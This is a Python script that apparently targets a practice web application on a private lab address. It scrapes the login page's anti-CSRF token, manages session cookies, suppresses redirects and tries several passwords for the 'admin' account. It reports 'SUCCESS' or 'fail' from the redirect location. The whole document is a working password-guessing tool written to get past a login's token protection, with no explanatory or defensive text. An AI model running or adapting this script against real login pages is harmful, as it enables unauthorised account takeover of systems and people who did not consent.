import sys, urllib.request, urllib.parse, re

BASE = "http://10.31.0.87:3000"

def new_session():
    class NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, req, fp, code, msg, headers, newurl):
            return None
    op = urllib.request.build_opener(NoRedirect)
    pg = op.open(BASE + "/login.php", timeout=15)
    setcookie = pg.headers.get_all("Set-Cookie") or []
    body_html = pg.read().decode()
    tok = re.search(r"user_token' value='([0-9a-f]+)'", body_html).group(1)
    cookies = {}
    for c in setcookie:
        k, v = c.split(";")[0].split("=", 1)
        if k == "PHPSESSID":
            cookies["PHPSESSID"] = v  # last write wins (server-set)
        else:
            cookies.setdefault(k, v)  # first write wins for others
    ck = "; ".join("%s=%s" % kv for kv in cookies.items())
    return op, ck, tok

def do_login(op, ck, tok, user, pw):
    data = urllib.parse.urlencode({"username": user, "password": pw, "Login": "Login", "user_token": tok}).encode()
    req = urllib.request.Request(BASE + "/login.php", data=data, method="POST")
    req.add_header("Cookie", ck)
    req.add_header("User-Agent", "Mozilla/5.0")
    try:
        r = op.open(req, timeout=15)
        loc = "(none)"
    except urllib.error.HTTPError as exc:
        loc = exc.headers.get("Location")
    return loc

if __name__ == "__main__":
    for pw in ["password", "captchapwn1", "pwned1"]:
        op, ck, tok = new_session()
        loc = do_login(op, ck, tok, "admin", pw)
        ok = (loc and "login.php" not in str(loc))
        sys.stdout.write("admin/%s => loc=%s [%s]\n" % (pw, loc, "SUCCESS" if ok else "fail"))
